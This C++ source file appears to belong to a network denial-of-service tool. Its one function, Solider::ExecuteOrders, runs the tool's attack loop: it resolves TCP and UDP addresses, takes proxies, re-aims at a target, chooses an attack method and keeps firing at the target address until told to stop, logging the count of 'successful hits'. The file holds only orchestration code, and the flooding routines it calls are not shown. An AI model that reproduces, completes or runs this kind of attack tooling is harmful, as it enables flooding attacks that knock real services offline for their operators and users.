#include <memory>

#include "gun.hpp"
#include "solider.h"

#include "resolvers.h"
#include "wrappers/tcp_wrapper.h"
#include "gun_holder.h"

using namespace Wrappers::HTTP;
using namespace Wrappers::TCP;
using namespace Wrappers::UDP;

void Solider::ExecuteOrders(const TaskController &task,
	Attackers::Target &target, SPProxyGetter proxyGetter)
{
	std::size_t hitsCount{0};
	NetUtil::PAddressResolver tcpResolver{std::make_unique<TCPAddressResolver>()};
	NetUtil::PAddressResolver udpResolver{std::make_unique<UDPAddressResolver>()};

	Attackers::Gun gun{Attackers::DummyGun{std::cref(task)}};
	while(!task.ShouldStop())
	{
		if(target.NeedWeaponAim())
		{
			target.Retarget(task);
		}

		Attackers::AttackMethod method = target.GetAttackMethod();
		const URI coordinates = target.GetCoordinates();

		if(gun.EmplaceGun(method, task, proxyGetter,
			tcpResolver, udpResolver))
		{
			hitsCount += gun->FireTillDead(coordinates);
		}
	}
	SPDLOG_INFO("Stoping execution with {} succesfull hits", hitsCount);
}
